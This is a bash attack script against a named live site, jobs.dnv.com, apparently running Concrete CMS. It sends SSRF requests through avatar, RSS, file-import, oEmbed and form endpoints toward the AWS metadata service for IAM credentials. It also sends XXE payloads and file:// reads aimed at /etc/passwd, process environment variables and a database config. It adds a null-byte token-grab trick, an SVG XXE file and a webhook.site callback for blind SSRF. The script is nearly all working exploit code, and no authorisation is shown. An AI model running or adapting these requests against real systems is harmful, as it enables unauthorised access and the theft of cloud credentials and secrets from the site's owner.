#!/bin/bash
# Test for SSRF and XXE - Can lead to internal data access

TARGET="https://jobs.dnv.com"

echo "=== TESTING FOR SSRF & XXE (Data Exfiltration) ==="

# 1. Test for SSRF in image/URL fetch endpoints
echo -e "\n[1] Testing SSRF via Image/URL Fetch..."

TOKEN=$(curl -c /tmp/ssrf_cookies.txt -s "${TARGET}/index.php?cID=156%00" | grep -oP 'name="ccm_token" value="\K[^"]+')
echo "Token: $TOKEN"

# Test avatar/profile picture upload from URL
echo "  Testing avatar upload from URL (SSRF)..."
curl -b /tmp/ssrf_cookies.txt -s \
    -X POST "${TARGET}/index.php/ccm/system/user/upload_avatar" \
    -d "avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&ccm_token=$TOKEN" \
    -w "\nHTTP: %{http_code}\n" | grep -i "error\|success\|credentials\|role" | head -20

# Test RSS feed fetch (SSRF)
echo -e "\n  Testing RSS feed fetch (SSRF)..."
curl -b /tmp/ssrf_cookies.txt -s \
    -X POST "${TARGET}/index.php/tools/required/dashboard/get_rss_feed" \
    -d "url=http://169.254.169.254/latest/meta-data/&ccm_token=$TOKEN" \
    -w "\nHTTP: %{http_code}\n" | head -50

# Test remote file import (SSRF)
echo -e "\n  Testing remote file import (SSRF)..."
curl -b /tmp/ssrf_cookies.txt -s \
    -X POST "${TARGET}/index.php/ccm/system/file/import_remote" \
    -d "url=http://169.254.169.254/latest/meta-data/&ccm_token=$TOKEN" \
    -w "\nHTTP: %{http_code}\n" | head -50

# Test preview/thumbnail generation from URL
echo -e "\n  Testing thumbnail generation (SSRF)..."
curl -b /tmp/ssrf_cookies.txt -s \
    -X POST "${TARGET}/index.php/ccm/system/file/thumb" \
    -d "url=file:///etc/passwd&ccm_token=$TOKEN" \
    -w "\nHTTP: %{http_code}\n" | head -50

# 2. Test for XXE in various endpoints
echo -e "\n[2] Testing XXE (XML External Entity)..."

XXE_PAYLOAD='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>'

# Test XXE on potential XML endpoints
ENDPOINTS=(
    "/index.php/ccm/system/api"
    "/index.php/tools/required/dashboard"
    "/api"
    "/index.php/ccm/system/xml"
)

for endpoint in "${ENDPOINTS[@]}"; do
    echo "  Testing XXE on: $endpoint"
    curl -s "${TARGET}${endpoint}%00" \
        -H "Content-Type: application/xml" \
        -d "$XXE_PAYLOAD" \
        -w "\nHTTP: %{http_code}\n" | grep -E "(root:|HTTP:|error)" | head -10
done

# 3. Test for SSRF via Webhook/Callback URLs
echo -e "\n[3] Testing SSRF via Webhook URLs..."

# Use a Burp Collaborator or webhook.site URL to detect blind SSRF
WEBHOOK_URL="http://webhook.site/YOUR-UNIQUE-ID"  # Replace with actual webhook

echo "  Testing webhook callback (blind SSRF detection)..."
curl -b /tmp/ssrf_cookies.txt -s \
    -X POST "${TARGET}/index.php/ccm/system/notification/webhook" \
    -d "callback_url=$WEBHOOK_URL&ccm_token=$TOKEN" \
    -w "\nHTTP: %{http_code}\n"

# 4. Test SSRF via oEmbed
echo -e "\n[4] Testing oEmbed SSRF..."
curl -s "${TARGET}/index.php/tools/required/blocks/video/oembed%00?url=http://169.254.169.254/latest/meta-data/" \
    -w "\nHTTP: %{http_code}\n" | head -50

# 5. Test for XXE in file upload (SVG)
echo -e "\n[5] Testing XXE via SVG Upload..."

SVG_XXE='<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>'

echo "$SVG_XXE" > /tmp/xxe_test.svg

echo "  SVG created at /tmp/xxe_test.svg"
echo "  Manual test: Upload this SVG file and view it"
echo "  If it displays /etc/passwd content → XXE vulnerability confirmed"

# 6. Test for SSRF in external form submission
echo -e "\n[6] Testing SSRF in external forms..."
curl -b /tmp/ssrf_cookies.txt -s \
    -X POST "${TARGET}/index.php/tools/required/forms/submit_external" \
    -d "target=http://169.254.169.254/latest/meta-data/&ccm_token=$TOKEN" \
    -w "\nHTTP: %{http_code}\n" | head -50

# 7. Test reading local files via file:// protocol
echo -e "\n[7] Testing file:// protocol (local file read)..."

FILE_URLS=(
    "file:///etc/passwd"
    "file:///proc/self/environ"
    "file:///var/www/html/application/config/database.php"
)

for file_url in "${FILE_URLS[@]}"; do
    echo "  Testing: $file_url"
    curl -b /tmp/ssrf_cookies.txt -s \
        -X POST "${TARGET}/index.php/tools/required/blocks/rss_display/get_feed" \
        -d "url=${file_url}&ccm_token=$TOKEN" \
        -w "\nHTTP: %{http_code}\n" | grep -E "(root:|DATABASE|password)" | head -10
done

echo -e "\n=== RESULTS ==="
echo "Look for:"
echo "  🔥 AWS metadata in responses (IAM roles, credentials)"
echo "  🔥 /etc/passwd content"
echo "  🔥 Database configuration"
echo "  🔥 Environment variables"
echo "  🔥 Internal service responses"
